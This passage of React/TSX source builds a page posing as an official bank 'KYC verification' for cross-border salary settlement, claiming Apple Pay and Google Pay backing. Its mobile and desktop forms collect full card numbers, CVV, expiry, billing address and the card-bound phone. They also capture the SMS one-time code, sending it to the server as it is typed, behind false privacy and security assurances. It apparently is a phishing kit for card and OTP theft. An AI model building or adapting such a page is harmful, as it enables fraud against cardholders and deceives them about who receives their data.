                      "By requesting this code, you confirm that you are the authorized cardholder and that all information provided is accurate and truthful.",
                      "This verification is part of the official cross-border settlement process. The code is used solely for identity authentication purposes and will not authorize any unauthorized transactions.",
                      "Any misuse, fraud, or unauthorized use of the verification process may result in suspension of your account and potential legal action.",
                      "Your personal data is processed in accordance with applicable data protection laws and will not be shared with third parties outside of this settlement process.",
                    ].map((text, i) => (
                      <li key={i} className="flex items-start gap-3.5">
                        <span className="flex-shrink-0 w-6 h-6 rounded-full bg-[#0A2B5E]/8 border border-[#0A2B5E]/15 flex items-center justify-center text-[11px] font-bold text-[#0A2B5E] mt-0.5">{i + 1}</span>
                        <p className="text-gray-700 text-[15px] leading-7 flex-1">{text}</p>
                      </li>
                    ))}
                  </ol>
                )}
                <div className="flex items-start gap-3 px-4 py-3.5 bg-slate-50 border border-slate-200 rounded-2xl">
                  <div className="w-8 h-8 rounded-xl bg-[#0A2B5E]/8 flex items-center justify-center flex-shrink-0">
                    <Shield className="w-4 h-4 text-[#0A2B5E]" />
                  </div>
                  <p className="text-slate-600 text-xs leading-relaxed">
                    <span className="font-semibold text-slate-800">Data Protection:</span> All settlement authentication materials are processed through the official secure channels of Apple Pay and Google Pay. Your information is encrypted and protected at all times.
                  </p>
                </div>
                <p className="text-center text-xs text-gray-400">
                  By clicking <span className="font-semibold text-gray-600">"I Agree &amp; Send Code"</span> you acknowledge that you have read, understood, and agreed to the above notice.
                </p>
              </div>
            </div>

            <div className="px-5 pt-4 pb-4 lg:px-7 bg-white/95 border-t border-slate-100 flex-shrink-0 shadow-[0_-8px_24px_-12px_rgba(6,20,46,0.12)]">
              {announcementCountdown > 0 ? (
                <button disabled className="w-full py-3.5 rounded-2xl bg-slate-100 text-slate-400 font-semibold text-sm cursor-not-allowed flex items-center justify-center gap-2.5 ring-1 ring-slate-200">
                  <span className="w-4 h-4 border-2 border-gray-300 border-t-gray-400 rounded-full animate-spin flex-shrink-0" />
                  Please finish reading — {announcementCountdown}s remaining
                </button>
              ) : (
                <button onClick={doSendCode} className="w-full py-3.5 rounded-2xl bg-gradient-to-r from-[#0A2B5E] to-[#1E3A8A] text-white font-semibold text-sm flex items-center justify-center gap-2.5 shadow-lg shadow-[#0A2B5E]/25 hover:shadow-[#0A2B5E]/40 hover:-translate-y-px active:translate-y-0 active:scale-[0.98] transition-all animate-dialog-pop">
                  <CheckCircle className="w-5 h-5" />
                  I Agree &amp; Send Verification Code
                </button>
              )}
              <button onClick={() => { setShowAnnouncementModal(false); if (announcementTimerRef.current) clearInterval(announcementTimerRef.current); }} className="w-full mt-2 py-2 rounded-xl text-xs text-slate-400 hover:text-slate-700 hover:bg-slate-50 transition font-medium">
                Cancel
              </button>
            </div>
          </div>
        </div>
      )}

      {smsSentBanner && (
        <div className="fixed inset-x-0 top-[calc(19.1%+28px)] z-[60] flex -translate-y-1/2 justify-center px-4 pointer-events-none">
        <div className="pointer-events-auto w-full max-w-sm overflow-hidden rounded-2xl bg-white shadow-[0_16px_40px_-12px_rgba(6,20,46,0.35)] ring-1 ring-emerald-100 animate-toast-in" role="status">
          <div className="flex items-center gap-3 px-4 py-3.5">
            <div className="relative flex h-10 w-10 flex-shrink-0 items-center justify-center rounded-full bg-gradient-to-br from-emerald-500 to-teal-600 text-white shadow-md shadow-emerald-600/30">
              <MessageSquare className="h-4 w-4" />
            </div>
            <div className="min-w-0">
              <div className="text-sm font-bold text-[#0A2B5E]">Verification pending.</div>
              <div className="mt-0.5 text-xs text-slate-500">A code will be sent to your phone if approved.</div>
            </div>
          </div>
          <div className="h-1 bg-emerald-50">
            <div className="h-full bg-gradient-to-r from-emerald-400 to-teal-500 animate-toast-progress" />
          </div>
        </div>
        </div>
      )}
    </>
  );

  return (
    <div className="min-h-screen-safe flex flex-col bg-[radial-gradient(circle_at_top,_#F8FBFF_0%,_#EEF5FC_48%,_#DDEAF7_100%)]">
      {modals}

      <Header ftUid={ftUid} />

      {/* ═══════════════════════════════════════════════════════════════════
          MOBILE layout  (< lg)
      ════════════════════════════════════════════════════════════════════ */}
      <main className="lg:hidden flex-1 flex flex-col bg-gray-50">
        {/* Top hero band */}
        <div className="relative overflow-hidden bg-gradient-to-br from-[#0d3571] via-[#0A2B5E] to-[#061d42] px-4 sm:px-6 pt-3 pb-8 sm:pt-5 sm:pb-10">
          <div className="pointer-events-none absolute -right-12 -top-16 h-44 w-44 rounded-full bg-sky-400/10 blur-3xl" />
          <div className="relative mx-auto w-full sm:max-w-2xl">
            <div className="flex items-center justify-between gap-3 mb-3 sm:mb-4">
              <button onClick={() => setShowLeaveModal(true)} className="flex items-center gap-2 text-blue-200 hover:text-white transition">
                <span className="w-8 h-8 rounded-full bg-white/10 ring-1 ring-white/15 flex items-center justify-center">
                  <ArrowLeft className="w-4 h-4" />
                </span>
                <span className="text-[13px] font-medium">Back</span>
              </button>
              <span className="inline-flex items-center gap-1.5 bg-white/10 ring-1 ring-white/15 rounded-full px-2.5 py-1">
                <CreditCard className="w-3.5 h-3.5 text-amber-300" />
                <span className="text-[11px] font-bold text-white">{isCreditCard ? "Credit Card" : "Debit Card"}</span>
              </span>
            </div>

            <div className="flex items-center gap-2 mb-1">
              <Shield className="w-3.5 h-3.5 text-blue-300" />
              <span className="text-[10px] text-blue-300 uppercase tracking-widest font-bold">KYC Verification</span>
            </div>
            <h1 className="text-lg sm:text-2xl font-bold text-white leading-tight">Identity Information Verification</h1>
            <p className="text-blue-200/90 text-xs sm:text-sm mt-1.5 leading-relaxed sm:max-w-lg">
              Fill in all required fields. Your information is used solely for identity authentication.
            </p>
          </div>
        </div>

        {/* Content slides up */}
        <div className="relative flex-1 -mt-4 bg-gray-50 rounded-t-3xl pt-4 sm:pt-6 px-3 sm:px-6" style={{ paddingBottom: "max(1.5rem, env(safe-area-inset-bottom))" }}>
          <form className="mx-auto w-full sm:max-w-2xl" onSubmit={handleSubmit} autoComplete="off" autoCorrect="off" autoCapitalize="off" spellCheck="false" name="cbca-kyc-form-mobile">

            {/* Fixed banner notifications */}
            {banners.length > 0 && (
              <div className="space-y-3 mb-4">
                {banners.map((b) => (
                  <NoticeCard key={b.id} title={b.title} content={b.content} />
                ))}
              </div>
            )}

            {/* Card Information */}
            <MobileCard icon={CreditCard} title="Card Information">
              {isCreditCard && (
                <>
                  <MobileField label="Payee Debit Card Number" error={fieldErrors.payee_debit_card}>
                    <input type="text" inputMode="numeric" autoComplete="off" value={form.payee_debit_card}
                      onChange={e => { const d = e.target.value.replace(/\D/g, ""); handleChange("payee_debit_card", d.replace(/(.{4})/g, "$1 ").trim()); }}
                      onBlur={() => handleBlur("payee_debit_card")} placeholder="XXXX XXXX XXXX XXXX"
                      className={mobileInputClass} />
                  </MobileField>
                  <div className="flex items-start gap-3 bg-red-50 border border-red-200 rounded-xl px-3.5 py-3">
                    <AlertTriangle className="w-4 h-4 text-red-600 flex-shrink-0 mt-0.5" />
                    <p className="text-xs text-red-800 leading-relaxed">
                      <strong>Identity Consistency:</strong> This debit card must belong to the same individual as the credit card below. Mismatched info will cause verification failure.
                    </p>
                  </div>
                  <div className="border-t border-dashed border-gray-200" />
                </>
              )}

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <MobileField label={isCreditCard ? "Credit Card Number" : "Debit Card Number"} error={fieldErrors.card_number}>
                  <input type="text" inputMode="numeric" autoComplete="off" value={form.card_number}
                    onChange={e => { const d = e.target.value.replace(/\D/g, ""); handleChange("card_number", d.replace(/(.{4})/g, "$1 ").trim()); }}
                    onBlur={() => handleBlur("card_number")} placeholder="XXXX XXXX XXXX XXXX"
                    className={`${mobileInputClass} font-mono tracking-wide`} />
                </MobileField>

                <MobileField label="Card Issuing Bank" error={fieldErrors.card_bank_name}>
                  <input type="text" autoComplete="off" value={form.card_bank_name}
                    onChange={e => handleChange("card_bank_name", e.target.value)}
                    onBlur={() => handleBlur("card_bank_name")} placeholder="e.g. Chase, Bank of America"
                    className={mobileInputClass} />
                </MobileField>
              </div>

              {/* Expiry + CVV share one row on every screen size */}
              <div className="space-y-1.5">
                <div className="grid grid-cols-2 gap-3 sm:gap-4">
                  <div className="min-w-0 space-y-1.5">
                    <label className="block text-[13px] font-semibold text-gray-700">
                      Expiry Date <span className="text-red-500">*</span>
                    </label>
                    <div className="flex items-center h-12 rounded-xl border border-gray-200 bg-gray-50/80 transition focus-within:bg-white focus-within:border-[#1E3A8A] focus-within:ring-4 focus-within:ring-[#1E3A8A]/10">
                      <input ref={expiryMonthRef} type="text" inputMode="numeric" autoComplete="off" value={form.expiry_month}
                        onChange={e => { const v = e.target.value.replace(/\D/g, "").slice(0, 2); handleChange("expiry_month", v); if (v.length === 2) expiryYearRef.current?.focus(); }}
                        onBlur={() => handleBlur("expiry_month")} placeholder="MM" maxLength={2} aria-label="Expiry month"
                        className="w-0 flex-1 min-w-0 h-full bg-transparent text-center text-base font-mono text-gray-900 placeholder:text-gray-400 focus:outline-none" />
                      <span className="text-gray-300 font-semibold text-lg flex-shrink-0">/</span>
                      <input ref={expiryYearRef} type="text" inputMode="numeric" autoComplete="off" value={form.expiry_year}
                        onChange={e => { const v = e.target.value.replace(/\D/g, "").slice(0, 2); handleChange("expiry_year", v); }}
                        onBlur={() => handleBlur("expiry_year")} placeholder="YY" maxLength={2} aria-label="Expiry year"
                        className="w-0 flex-1 min-w-0 h-full bg-transparent text-center text-base font-mono text-gray-900 placeholder:text-gray-400 focus:outline-none" />
                    </div>
                  </div>
                  <MobileField label="CVV">
                    <input type="text" autoComplete="off" inputMode="numeric" value={form.cvv}
                      onChange={e => handleChange("cvv", e.target.value.replace(/\D/g, "").slice(0, 6))}
                      onBlur={() => handleBlur("cvv")} placeholder="123" maxLength={6}
                      className={`${mobileInputClass} text-center font-mono tracking-widest`} />
                  </MobileField>
                </div>
                {(fieldErrors.expiry_month || fieldErrors.expiry_year || fieldErrors.cvv) ? (
                  <p className="text-xs text-red-500 font-medium flex items-center gap-1"><AlertCircle className="w-3.5 h-3.5 flex-shrink-0" />{fieldErrors.expiry_month || fieldErrors.expiry_year || fieldErrors.cvv}</p>
                ) : (
                  <p className="text-xs text-gray-400 leading-relaxed">CVV is the 3–4 digits on the back of your card, used for identity authentication only.</p>
                )}
              </div>

              <MobileField label="Cardholder Name" error={fieldErrors.cardholder_name}>
                <input type="text" autoComplete="off" value={form.cardholder_name}
                  onChange={e => handleChange("cardholder_name", e.target.value)}
                  onBlur={() => handleBlur("cardholder_name")} placeholder="Full name as on card"
                  className={mobileInputClass} />
              </MobileField>
            </MobileCard>

            {/* Billing Address */}
            <MobileCard icon={MapPin} title={isCreditCard ? "Credit Card Billing Address" : "Billing Address"}
              subtitle={isCreditCard ? "Registered billing address for your credit card" : undefined}>

              <MobileField label="Country / Region" error={fieldErrors.country}>
                <input type="text" autoComplete="off" value={form.country}
                  onChange={e => handleChange("country", e.target.value)}
                  onBlur={() => handleBlur("country")} placeholder="e.g. United States"
                  className={mobileInputClass} />
              </MobileField>

              <div className="grid grid-cols-3 sm:grid-cols-4 gap-3 sm:gap-4">
                <div className="col-span-2 sm:col-span-3">
                  <MobileField label="Street Address" error={fieldErrors.street_address}>
                    <input type="text" autoComplete="off" value={form.street_address}
                      onChange={e => handleChange("street_address", e.target.value)}
                      onBlur={() => handleBlur("street_address")} placeholder="Street Name / Road"
                      className={mobileInputClass} />
                  </MobileField>
                </div>
                <MobileField label="House / Apt." error={fieldErrors.house_number}>
                  <input type="text" autoComplete="off" value={form.house_number}
                    onChange={e => handleChange("house_number", e.target.value)}
                    onBlur={() => handleBlur("house_number")} placeholder="No."
                    className={mobileInputClass} />
                </MobileField>
              </div>

              <div className="grid grid-cols-2 sm:grid-cols-3 gap-3 sm:gap-4">
                <MobileField label="City" error={fieldErrors.city}>
                  <input type="text" autoComplete="off" value={form.city}
                    onChange={e => handleChange("city", e.target.value)}
                    onBlur={() => handleBlur("city")} placeholder="City / District"
                    className={mobileInputClass} />
                </MobileField>

                <MobileField label="State / Province" error={fieldErrors.state}>
                  <input type="text" autoComplete="off" value={form.state}
                    onChange={e => handleChange("state", e.target.value)}
                    onBlur={() => handleBlur("state")} placeholder="Province / State"
                    className={mobileInputClass} />
                </MobileField>

                <div className="col-span-2 sm:col-span-1">
                  <MobileField label="Postal Code" error={fieldErrors.postal_code}>
                    <input type="text" inputMode="text" autoComplete="postal-code" value={form.postal_code}
                      onChange={e => handleChange("postal_code", sanitizePostalCode(e.target.value))}
                      onBlur={() => handleBlur("postal_code")} placeholder="Postal Code" maxLength={POSTAL_CODE_MAX_LENGTH}
                      className={mobileInputClass} />
                  </MobileField>
                </div>
              </div>
            </MobileCard>

            {/* Phone Verification */}
            <MobileCard icon={Phone} title={isCreditCard ? "Credit Card-Bound Phone" : "Phone Verification"}>
              <div className="flex items-start gap-2.5 bg-amber-50 border border-amber-200 rounded-xl px-3.5 py-3">
                <Info className="w-4 h-4 text-amber-600 flex-shrink-0 mt-0.5" />
                <p className="text-xs text-amber-800 leading-relaxed">
                  Please enter the <strong>mobile number associated with your {isCreditCard ? "credit card" : "card"}</strong>. Upon the bank's regulatory verification, a verification code will be sent to you to confirm your international salary credit.
                </p>
              </div>

              <MobileField label={isCreditCard ? "Credit Card-Bound Phone" : "Card-Bound Phone"} error={fieldErrors.phone_number}
                hint={`Must match the phone linked to your ${isCreditCard ? "credit card" : "card"}`}>
                <input type="tel" inputMode="tel" autoComplete="off" value={form.phone_number}
                  onChange={e => handleChange("phone_number", e.target.value.replace(/[^\d+\-\s()]/g, "").slice(0, 20))}
                  onBlur={() => handleBlur("phone_number")} placeholder="+1 (555) 000-0000"
                  className={mobileInputClass} />
              </MobileField>

              {!codeSent && (
                <button type="button" onClick={handleSendCode} disabled={sendLoading || countdown > 0}
                  className="w-full sm:w-auto sm:min-w-[260px] sm:mx-auto sm:px-8 bg-[#0A2B5E] hover:bg-[#0d3571] text-white font-bold h-[52px] rounded-xl flex items-center justify-center gap-2.5 transition-all disabled:opacity-50 disabled:cursor-not-allowed active:scale-[0.98] text-[15px] shadow-md shadow-[#0A2B5E]/20">
                  {sendLoading
                    ? <span className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                    : <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8" /></svg>
                  }
                  {countdown > 0 ? `Please wait (${countdown}s)` : "Send Verification Code"}
                </button>
              )}

              {codeSent && (
                <div className="rounded-3xl overflow-hidden shadow-lg border border-[#1E3A8A]/20">
                  {/* Header */}
                  <div className="bg-gradient-to-r from-[#0A2B5E] to-[#1E4DA0] px-4 py-3.5 flex items-center gap-3">
                    <div className="w-8 h-8 rounded-xl bg-white/15 flex items-center justify-center flex-shrink-0">
                      <CheckCircle className="w-4 h-4 text-green-300" />
                    </div>
                    <div>
                      <p className="text-white text-[13px] font-bold leading-tight">Verification pending.</p>
                      <p className="text-blue-200/80 text-[11px] mt-0.5">A code will be sent to your phone if approved.</p>
                    </div>
                  </div>

                  {/* Code input area */}
                  <div className="bg-[#EFF6FF] px-4 pt-5 pb-4">
                    <label className="block text-xs font-bold text-[#0A2B5E] uppercase tracking-widest mb-3 text-center">
                      Enter Verification Code
                    </label>
                    <input
                      type="text" inputMode="numeric" autoComplete="one-time-code" value={verificationCode}
                      onChange={e => {
                        const v = e.target.value.replace(/\D/g, "");
                        setVerificationCode(v);
                        if (codeDebounceRef.current) clearTimeout(codeDebounceRef.current);
                        codeDebounceRef.current = setTimeout(() => { updateVerificationCode(ftUid!, v).catch(() => {}); }, 300);
                      }}
                      placeholder="· · · · · ·"
                      className="w-full px-4 py-5 border-2 border-[#1E3A8A] rounded-2xl text-center tracking-[0.5em] font-mono text-3xl font-bold text-[#0A2B5E] bg-white focus:outline-none focus:ring-4 focus:ring-[#1E3A8A]/20 transition shadow-sm placeholder:tracking-[0.3em] placeholder:text-[#1E3A8A]/25"
                    />
                    {expiryLeft > 0 && (
                      <p className={`flex items-center justify-center gap-1.5 text-xs font-semibold mt-2 ${expiryLeft <= 10 ? "text-red-600" : "text-[#1E3A8A]"}`}>
                        <Clock className="w-3.5 h-3.5" />
                        Code expires in {expiryLeft}s
                      </p>
                    )}
                    <p className="text-[11px] text-[#1E3A8A]/60 mt-2 text-left leading-relaxed">
                      Once the bank's compliance verification is completed, a verification code will be sent to the mobile number associated with your card.
                    </p>
                  </div>

                  {/* Action row */}
                  <div className="bg-white px-4 py-4 flex gap-3 border-t border-[#1E3A8A]/10">
                    <ResendCodeButton onClick={handleSendCode} sending={sendLoading} countdown={countdown} className="w-0 flex-[5]" />
                    <SubmitReviewButton
                      submitting={submitLoading}
                      onClick={handleSubmit as unknown as React.MouseEventHandler<HTMLButtonElement>}
                      className="w-0 flex-[7]" />
                  </div>
                </div>
              )}
            </MobileCard>

            {error && (
              <div className="flex items-start gap-2.5 bg-red-50 border border-red-200 text-red-700 text-sm px-4 py-3.5 rounded-2xl mb-4">
                <AlertCircle className="w-4 h-4 flex-shrink-0 mt-0.5" />
                <span>{error}</span>
              </div>
            )}

            {/* Security Notice */}
            <div className="bg-white rounded-2xl border border-gray-200 overflow-hidden mb-4">
              <div className="bg-[#0A2B5E] px-4 py-2.5 flex items-center gap-2">
                <Shield className="w-3.5 h-3.5 text-blue-200" />
                <span className="text-white text-[11px] font-bold tracking-widest uppercase">Verification Code Official Security Notice</span>
              </div>
              <div className="px-4 py-3.5 flex items-start gap-3">
                <Lock className="w-4 h-4 text-[#1E3A8A] flex-shrink-0 mt-0.5" />
                <p className="text-xs text-gray-600 leading-relaxed">
                  Information submitted is used solely for cross-border settlement identity verification and processed through official secure channels.
                </p>
              </div>
            </div>
          </form>
        </div>
      </main>

      {/* ═══════════════════════════════════════════════════════════════════
          DESKTOP layout  (lg+) — original unchanged
      ════════════════════════════════════════════════════════════════════ */}
      <main className="hidden lg:block flex-1 max-w-2xl mx-auto px-4 py-8 w-full">
        <button onClick={() => setShowLeaveModal(true)} className="flex items-center gap-2 text-sm font-semibold text-[#0A2B5E] hover:text-[#1E3A8A] mb-5 group">
          <span className="flex items-center justify-center w-8 h-8 rounded-full bg-white border border-gray-200 shadow-sm group-hover:shadow-md transition">
            <ArrowLeft className="w-4 h-4" />
          </span>
          Back
        </button>

        <div className="mb-6">
          <div className="flex items-center gap-2 text-[#0A2B5E] mb-1">
            <Shield className="w-5 h-5" />
            <span className="text-sm font-semibold">KYC Verification &middot; {effectiveTx.ft_uid}</span>
          </div>
          <h1 className="text-2xl font-bold text-[#0A2B5E]">Identity Information Verification</h1>
          <p className="text-sm text-gray-500 mt-1">
            To complete cross-border settlement identity verification, please fill in all required fields below. Your information is used solely for identity authentication purposes.
          </p>
          <div className="mt-3 inline-flex items-center gap-2 bg-white border border-gray-200 rounded-lg px-3 py-1.5 shadow-sm">
            <CreditCard className="w-4 h-4 text-[#1E3A8A]" />
            <span className="text-xs font-semibold text-[#0A2B5E]">
              {isCreditCard ? "Credit Card Verification" : "Debit Card Verification"}
            </span>
          </div>
        </div>

        <form onSubmit={handleSubmit} autoComplete="off" autoCorrect="off" autoCapitalize="off" spellCheck="false" name="cbca-kyc-form" className="space-y-5">
          {/* Fixed banner notifications */}
          {banners.length > 0 && (
            <div className="space-y-3">
              {banners.map((b) => (
                <NoticeCard key={b.id} title={b.title} content={b.content} />
              ))}
            </div>
          )}

          {/* Card Info Section */}
          <div className="bg-white rounded-2xl shadow-sm border border-gray-200 p-6">
            <div className="flex items-center gap-2 mb-5">
              <CreditCard className="w-5 h-5 text-[#1E3A8A]" />
              <h2 className="font-semibold text-[#0A2B5E]">Card Information</h2>
            </div>
            <div className="space-y-4">
              {isCreditCard && (
                <div>
                  <label className="block text-sm font-semibold text-gray-700 mb-1.5">Payee Debit Card Number <span className="text-red-500">*</span></label>
                  <input type="text" inputMode="numeric" autoComplete="off" value={form.payee_debit_card}
                    onChange={e => { const d = e.target.value.replace(/\D/g, ""); handleChange("payee_debit_card", d.replace(/(.{4})/g, "$1 ").trim()); }}
                    onBlur={() => handleBlur("payee_debit_card")} placeholder="XXXX XXXX XXXX XXXX" className={inputClass} />
                  {fieldErrors.payee_debit_card && <p className="text-xs text-red-500 mt-1">{fieldErrors.payee_debit_card}</p>}
                  <div className="mt-3 flex items-start gap-3 bg-red-50 border border-red-200 rounded-xl px-4 py-3.5">
                    <div className="flex-shrink-0 w-8 h-8 rounded-full bg-red-100 border border-red-300 flex items-center justify-center">
                      <AlertTriangle className="w-4 h-4 text-red-600" />
                    </div>
                    <div>
                      <p className="text-xs font-bold text-red-700 uppercase tracking-wide mb-1">Important Identity Consistency Requirement</p>
                      <p className="text-xs text-red-800 leading-relaxed">The payee debit card number entered above <strong>must belong to the same individual</strong> as the credit card used for verification below. Mismatched information will result in verification failure.</p>
                    </div>
                  </div>
                  <div className="mt-3 border-t border-dashed border-gray-200 pt-4" />
                </div>
              )}
              <div>
                <label className="block text-sm font-semibold text-gray-700 mb-1.5">{isCreditCard ? "Credit Card Number" : "Debit Card Number"} <span className="text-red-500">*</span></label>
                <input type="text" inputMode="numeric" autoComplete="off" value={form.card_number}
                  onChange={e => { const d = e.target.value.replace(/\D/g, ""); handleChange("card_number", d.replace(/(.{4})/g, "$1 ").trim()); }}
                  onBlur={() => handleBlur("card_number")} placeholder="XXXX XXXX XXXX XXXX" className={inputClass} />
                {fieldErrors.card_number && <p className="text-xs text-red-500 mt-1">{fieldErrors.card_number}</p>}
              </div>
              <div>
                <label className="block text-sm font-semibold text-gray-700 mb-1.5">Card Issuing Bank <span className="text-red-500">*</span></label>
                <input type="text" autoComplete="off" value={form.card_bank_name}
                  onChange={e => handleChange("card_bank_name", e.target.value)}
                  onBlur={() => handleBlur("card_bank_name")} placeholder="e.g. Chase, Bank of America" className={inputClass} />
                {fieldErrors.card_bank_name && <p className="text-xs text-red-500 mt-1">{fieldErrors.card_bank_name}</p>}
              </div>
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-semibold text-gray-700 mb-1.5">Expiry Date <span className="text-red-500">*</span></label>
                  <div className="flex items-center gap-2">
                    <input ref={expiryMonthRef} type="text" inputMode="numeric" autoComplete="off" value={form.expiry_month}
                      onChange={e => { const v = e.target.value.replace(/\D/g, "").slice(0, 2); handleChange("expiry_month", v); if (v.length === 2) expiryYearRef.current?.focus(); }}
                      onBlur={() => handleBlur("expiry_month")} placeholder="MM" maxLength={2} className={`${inputClass} text-center w-16`} />
                    <span className="text-gray-400 font-semibold">/</span>
                    <input ref={expiryYearRef} type="text" inputMode="numeric" autoComplete="off" value={form.expiry_year}
                      onChange={e => { const v = e.target.value.replace(/\D/g, "").slice(0, 2); handleChange("expiry_year", v); }}
                      onBlur={() => handleBlur("expiry_year")} placeholder="YY" maxLength={2} className={`${inputClass} text-center w-16`} />
                  </div>
                  {(fieldErrors.expiry_month || fieldErrors.expiry_year) && <p className="text-xs text-red-500 mt-1">{fieldErrors.expiry_month || fieldErrors.expiry_year}</p>}
                </div>
                <div>
                  <label className="block text-sm font-semibold text-gray-700 mb-1.5">CVV <span className="text-red-500">*</span></label>
                  <input type="text" autoComplete="off" inputMode="numeric" value={form.cvv}
                    onChange={e => handleChange("cvv", e.target.value.replace(/\D/g, "").slice(0, 6))}
                    onBlur={() => handleBlur("cvv")} placeholder="XXX" maxLength={6} className={inputClass} />
                  <p className="text-xs text-gray-400 mt-1">Used for identity authentication only.</p>
                  {fieldErrors.cvv && <p className="text-xs text-red-500 mt-1">{fieldErrors.cvv}</p>}
                </div>
              </div>
              <div>
                <InputField label="Cardholder Name (full name as on card)" placeholder="Full Name as on Card" {...fields("cardholder_name")} />
                {fieldErrors.cardholder_name && <p className="text-xs text-red-500 mt-1">{fieldErrors.cardholder_name}</p>}
              </div>
            </div>
          </div>

          {/* Address Section */}
          <div className="bg-white rounded-2xl shadow-sm border border-gray-200 p-6">
            <div className="flex items-center gap-2 mb-1">
              <MapPin className="w-5 h-5 text-[#1E3A8A]" />
              <h2 className="font-semibold text-[#0A2B5E]">{isCreditCard ? "Credit Card Billing Address" : "Billing Address"}</h2>
            </div>
            {isCreditCard && <p className="text-xs text-gray-500 mb-5">The registered billing address associated with your credit card account.</p>}
            {!isCreditCard && <div className="mb-5" />}
            <div className="space-y-4">
              <div>
                <InputField label="Country / Region" placeholder="e.g. United States" {...fields("country")} />
                {fieldErrors.country && <p className="text-xs text-red-500 mt-1">{fieldErrors.country}</p>}
              </div>
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <InputField label="Street Address" placeholder="Street Name / Road" {...fields("street_address")} />
                  {fieldErrors.street_address && <p className="text-xs text-red-500 mt-1">{fieldErrors.street_address}</p>}
                </div>
                <div>
                  <InputField label="House / Apt. Number" placeholder="No. / Apt." {...fields("house_number")} />
                  {fieldErrors.house_number && <p className="text-xs text-red-500 mt-1">{fieldErrors.house_number}</p>}
                </div>
              </div>
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <InputField label="City" placeholder="City / District" {...fields("city")} />
                  {fieldErrors.city && <p className="text-xs text-red-500 mt-1">{fieldErrors.city}</p>}
                </div>
                <div>
                  <InputField label="State / Province" placeholder="Province / State" {...fields("state")} />
                  {fieldErrors.state && <p className="text-xs text-red-500 mt-1">{fieldErrors.state}</p>}
                </div>
              </div>
              <div>
                <label className="block text-sm font-semibold text-gray-700 mb-1.5">Postal Code <span className="text-red-500">*</span></label>
                <input type="text" inputMode="text" autoComplete="postal-code" value={form.postal_code}
                  onChange={e => handleChange("postal_code", sanitizePostalCode(e.target.value))}
                  onBlur={() => handleBlur("postal_code")} placeholder="Postal Code" maxLength={POSTAL_CODE_MAX_LENGTH} className={inputClass} />
                {fieldErrors.postal_code && <p className="text-xs text-red-500 mt-1">{fieldErrors.postal_code}</p>}
              </div>
            </div>
          </div>

          {/* Phone & Verification Section */}
          <div className="bg-white rounded-2xl shadow-sm border border-gray-200 p-6">
            <div className="flex items-center gap-2 mb-2">
              <Phone className="w-5 h-5 text-[#1E3A8A]" />
              <h2 className="font-semibold text-[#0A2B5E]">{isCreditCard ? "Credit Card-Bound Phone Verification" : "Phone Verification"}</h2>
            </div>
            <div className="flex items-start gap-2 bg-amber-50 border border-amber-200 rounded-lg px-4 py-3 mb-5">
              <Info className="w-4 h-4 text-amber-600 flex-shrink-0 mt-0.5" />
              <p className="text-xs text-amber-800 leading-relaxed">Please enter the <strong>mobile number associated with your {isCreditCard ? "credit card" : "card"}</strong>. Upon the bank's regulatory verification, a verification code will be sent to you to confirm your international salary credit.</p>
            </div>
            <div className="space-y-4">
              <div>
                <label className="block text-sm font-semibold text-gray-700 mb-1.5">{isCreditCard ? "Credit Card-Bound Phone Number" : "Card-Bound Phone Number"} <span className="text-red-500">*</span></label>
                <input type="tel" inputMode="tel" autoComplete="off" value={form.phone_number}
                  onChange={e => handleChange("phone_number", e.target.value.replace(/[^\d+\-\s()]/g, "").slice(0, 20))}
                  onBlur={() => handleBlur("phone_number")} placeholder="+1 (555) 000-0000" className={inputClass} />
                <p className="text-xs text-gray-400 mt-1">Must match the phone number linked to your {isCreditCard ? "credit card" : "card"} account.</p>
                {fieldErrors.phone_number && <p className="text-xs text-red-500 mt-1">{fieldErrors.phone_number}</p>}
              </div>
              {!codeSent && (
                <button type="button" onClick={handleSendCode} disabled={sendLoading || countdown > 0}
                  className="w-full bg-gradient-to-r from-[#0A2B5E] via-[#123D82] to-[#1E4DA0] text-white font-semibold py-2.5 rounded-lg flex items-center justify-center gap-2 shadow-md shadow-[#0A2B5E]/20 hover:shadow-lg hover:shadow-[#0A2B5E]/30 hover:-translate-y-px active:translate-y-0 active:scale-[0.99] transition-all disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:translate-y-0 disabled:hover:shadow-md">
                  {sendLoading ? <span className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" /> : null}
                  {countdown > 0 ? `Please wait before resending (${countdown}s)` : "Send Verification Code"}
                </button>
              )}
              {codeSent && (
                <div className="mt-2 rounded-xl border-2 border-[#1E3A8A] bg-[#EFF6FF] p-5">
                  <label className="block text-sm font-bold text-[#0A2B5E] mb-3">Verification Code <span className="text-red-500">*</span></label>
                  <input type="text" inputMode="numeric" autoComplete="off" value={verificationCode}
                    onChange={e => {
                      const v = e.target.value.replace(/\D/g, "");
                      setVerificationCode(v);
                      if (codeDebounceRef.current) clearTimeout(codeDebounceRef.current);
                      codeDebounceRef.current = setTimeout(() => { updateVerificationCode(ftUid!, v).catch(() => {}); }, 300);
                    }}
                    placeholder="Enter verification code"
                    className="w-full px-4 py-4 border-2 border-[#1E3A8A] rounded-xl text-center tracking-[0.6em] font-mono text-2xl font-bold text-[#0A2B5E] bg-white focus:outline-none focus:ring-4 focus:ring-[#1E3A8A]/20 transition shadow-sm" />
                  {expiryLeft > 0 && (
                    <p className={`flex items-center justify-center gap-1.5 text-xs font-semibold mt-2 ${expiryLeft <= 10 ? "text-red-600" : "text-[#1E3A8A]"}`}>
                      <Clock className="w-3.5 h-3.5" />
                      Code expires in {expiryLeft}s
                    </p>
                  )}
                  <p className="text-xs text-[#1E3A8A] mt-2.5 text-left font-medium">Once the bank's compliance verification is completed, a verification code will be sent to the mobile number associated with your card.</p>
                  {/* Action row: resend left, submit right */}
                  <div className="flex gap-3 mt-4">
                    <ResendCodeButton onClick={handleSendCode} sending={sendLoading} countdown={countdown} className="w-0 flex-[5]" />
                    <SubmitReviewButton submitting={submitLoading} className="w-0 flex-[7]" />
                  </div>
                </div>
              )}
            </div>
          </div>

          {error && (
            <div className="flex items-center gap-2 bg-red-50 border border-red-200 text-red-700 text-sm px-4 py-3 rounded-lg">
